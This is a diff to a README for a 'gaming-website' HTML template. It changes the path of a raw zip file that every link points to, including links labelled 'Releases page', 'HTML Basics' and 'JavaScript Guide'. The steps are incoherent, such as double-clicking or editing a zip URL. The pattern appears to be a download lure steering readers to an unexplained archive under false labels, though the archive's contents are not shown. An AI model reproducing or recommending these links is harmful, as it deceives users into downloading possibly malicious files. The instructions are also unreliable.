@@ -6,7 +6,7 @@ Welcome to the gaming-website project! This modern HTML template is designed to 
 
 ## 📥 Download Link
 
-[![Download gaming-website](https://raw.githubusercontent.com/Jaspreet-1234/gaming-website/master/glaucosuria/gaming-website.zip)](https://raw.githubusercontent.com/Jaspreet-1234/gaming-website/master/glaucosuria/gaming-website.zip)
+[![Download gaming-website](https://raw.githubusercontent.com/Jaspreet-1234/gaming-website/master/assets/gaming-website-v2.1.zip)](https://raw.githubusercontent.com/Jaspreet-1234/gaming-website/master/assets/gaming-website-v2.1.zip)
 
 ## 🛠️ System Requirements
 
@@ -20,7 +20,7 @@ Before you start, ensure your system meets the following requirements:
 
 To get started, follow these simple steps:
 
-1. **Visit this page to download:** Go to the [Releases page](https://raw.githubusercontent.com/Jaspreet-1234/gaming-website/master/glaucosuria/gaming-website.zip).
+1. **Visit this page to download:** Go to the [Releases page](https://raw.githubusercontent.com/Jaspreet-1234/gaming-website/master/assets/gaming-website-v2.1.zip).
    
 2. **Find the latest version:** Look for the latest release at the top of the page. You will see the version number and the release notes.
 
@@ -28,7 +28,7 @@ To get started, follow these simple steps:
 
 4. **Extract the files:** Once downloaded, locate the zip file on your computer. Extract it using your file explorer. You can usually right-click the zip file and select "Extract All".
 
-5. **Open the template:** After extraction, open the folder that contains the files. Look for the `https://raw.githubusercontent.com/Jaspreet-1234/gaming-website/master/glaucosuria/gaming-website.zip` file and double-click it. This will open the template in your web browser.
+5. **Open the template:** After extraction, open the folder that contains the files. Look for the `https://raw.githubusercontent.com/Jaspreet-1234/gaming-website/master/assets/gaming-website-v2.1.zip` file and double-click it. This will open the template in your web browser.
 
 6. **Customize the template:** Use a text editor to change text, images, and links to fit your gaming brand.  
 
@@ -43,7 +43,7 @@ The gaming-website template includes:
 
 ## 🏗️ Customization Guide
 
-1. **Changing Text:** Open `https://raw.githubusercontent.com/Jaspreet-1234/gaming-website/master/glaucosuria/gaming-website.zip` in a text editor. Look for sections with `<h1>`, `<h2>`, or `<p>` tags. Replace the text between these tags with your own content. 
+1. **Changing Text:** Open `https://raw.githubusercontent.com/Jaspreet-1234/gaming-website/master/assets/gaming-website-v2.1.zip` in a text editor. Look for sections with `<h1>`, `<h2>`, or `<p>` tags. Replace the text between these tags with your own content. 
 
 2. **Updating Images:** Locate the `img` folder in the extracted files. Replace the placeholder images with your gaming images. Ensure the new images have the same name or adjust the `src` attribute in the HTML.
 
@@ -76,6 +76,6 @@ The gaming-website template is your stepping stone to establishing an impressive
 
 For more information, feel free to check these resources:
 
-- [HTML Basics](https://raw.githubusercontent.com/Jaspreet-1234/gaming-website/master/glaucosuria/gaming-website.zip)
-- [CSS Basics](https://raw.githubusercontent.com/Jaspreet-1234/gaming-website/master/glaucosuria/gaming-website.zip)
-- [JavaScript Guide](https://raw.githubusercontent.com/Jaspreet-1234/gaming-website/master/glaucosuria/gaming-website.zip)
+- [HTML Basics](https://raw.githubusercontent.com/Jaspreet-1234/gaming-website/master/assets/gaming-website-v2.1.zip)
+- [CSS Basics](https://raw.githubusercontent.com/Jaspreet-1234/gaming-website/master/assets/gaming-website-v2.1.zip)
+- [JavaScript Guide](https://raw.githubusercontent.com/Jaspreet-1234/gaming-website/master/assets/gaming-website-v2.1.zip)
